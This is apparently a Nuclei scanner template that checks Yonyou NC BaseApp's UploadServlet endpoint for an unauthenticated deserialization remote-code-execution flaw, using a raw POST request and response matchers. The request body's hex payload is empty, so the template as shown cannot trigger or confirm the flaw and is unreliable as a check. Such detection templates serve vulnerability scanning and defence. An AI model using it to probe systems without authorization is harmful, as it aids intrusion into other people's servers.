id: yonyou-nc-uploadservlet-rce
info:
  name: Yonyou NC BaseApp UploadServlet Deserialization RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Yonyou NC BaseApp UploadServlet allows deserialization of arbitrary data, leading to Remote Code Execution (RCE). This vulnerability can be exploited by unauthenticated attackers to execute arbitrary commands on the target system.
  tags:
    - rce
    - deserialization
    - upload

http:
  - raw:
      - |
        POST /service/~baseapp/UploadServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {{hex_decode('')}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "java.io"
    extractors:
      - type: regex
        part: body
        regex:
          - "UploadServlet completed successfully"
